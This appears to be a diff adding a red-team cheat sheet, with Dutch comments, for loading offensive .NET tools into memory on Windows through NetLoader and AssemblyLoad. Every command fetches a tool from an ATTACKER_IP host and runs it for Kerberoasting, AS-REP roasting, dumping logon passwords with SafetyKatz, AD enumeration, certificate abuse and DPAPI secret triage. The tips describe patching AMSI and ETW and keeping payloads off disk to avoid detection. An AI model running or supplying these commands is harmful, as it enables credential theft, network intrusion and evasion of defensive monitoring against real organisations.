@@ -1,0 +1,25 @@
+# In-Memory .NET via NetLoader + AssemblyLoad (dubbele stage)
+# NetLoader: AMSI+ETW bypass ingebouwd, laadt .NET assembly vanaf URL
+# AssemblyLoad: laadt NetLoader zelf in-memory (niets op schijf behalve AssemblyLoad)
+
+# === Enkele stage: Loader.exe direct (binary op schijf) ===
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/Rubeus.exe kerberoast
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/Rubeus.exe asreproast
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe sekurlsa::logonpasswords exit
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/SharpHound.exe --CollectionMethods All
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/Certify.exe find /vulnerable
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/SharpUp.exe audit
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/Seatbelt.exe -group=all
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/Whisker.exe list
+C:\windows\tasks\Loader.exe -path http://ATTACKER_IP/tools/SharpDPAPI.exe triage
+
+# === Dubbele stage: AssemblyLoad → NetLoader → payload (volledig fileless) ===
+C:\windows\tasks\AssemblyLoad.exe http://ATTACKER_IP/tools/Loader.exe -path http://ATTACKER_IP/tools/Rubeus.exe kerberoast
+C:\windows\tasks\AssemblyLoad.exe http://ATTACKER_IP/tools/Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe sekurlsa::logonpasswords exit
+C:\windows\tasks\AssemblyLoad.exe http://ATTACKER_IP/tools/Loader.exe -path http://ATTACKER_IP/tools/SharpHound.exe --CollectionMethods All
+C:\windows\tasks\AssemblyLoad.exe http://ATTACKER_IP/tools/Loader.exe -path http://ATTACKER_IP/tools/Certify.exe find /vulnerable
+
+# Tip: AssemblyLoad.exe is de enige binary op schijf - klein, minder signatures dan Loader.exe
+# Tip: Loader.exe + payload worden nooit naar schijf geschreven
+# Tip: AMSI+ETW worden automatisch gepatcht door NetLoader voor payload executie
+# Tip: Werkt niet met native PE's (alleen .NET managed assemblies)
